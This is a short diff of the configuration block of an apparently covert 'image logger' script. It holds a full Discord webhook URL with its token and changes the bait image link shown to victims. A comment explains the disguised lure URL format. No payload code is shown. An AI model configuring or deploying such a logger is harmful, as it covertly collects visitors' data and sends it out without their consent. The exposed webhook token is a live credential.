@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1348119971766468682/jnl_2vYfyP8u8M5AlpgfLJ1qBKURoPz1l3RmElfj0zaTrBcPymgPp8caxxu7p16KEflx",
-    "image": " https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pinterest.com%2Fpin%2Ffunny-animated-emoticons-bonzi-buddy-swag--11751649021309027%2F&psig=AOvVaw3BcACmxeAMSGM_yBcEQrpd&ust=1741663400609000&source=images&cd=vfe&opi=89978449&ved=0CBMQjRxqFwoTCJii5vTH_osDFQAAAAAdAAAAABAE ", # You can also have a custom image by using a URL argument
+    "image": "  https://i.ytimg.com/vi/ZsJcaoITy4Q/sddefault.jpg?v=66eae39e  ", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
